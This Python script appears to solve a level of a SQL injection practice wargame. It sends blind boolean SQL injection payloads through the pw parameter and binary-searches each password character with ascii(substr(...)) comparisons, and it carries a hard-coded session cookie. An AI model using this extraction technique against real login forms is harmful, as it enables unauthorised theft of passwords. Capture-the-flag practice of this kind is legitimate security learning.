import requests
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {
    'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'
}
params = {
    'pw': None
}

def worker(i):
    start,end=0,255
    while True:
        search = int((start + end)/2)
        payload = "' or id='guest' and ascii(substr(pw,{},1)) <= {}#".format(i,search)
        params['pw'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            payload = "' or id='guest' and ascii(substr(pw,{},1)) = {}#".format(i,search)
            params['pw'] = payload
            print(payload)
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello admin" in response.text):
                print("find the pw",chr(search))
                return chr(search)
            end = search
        else:
            start = search
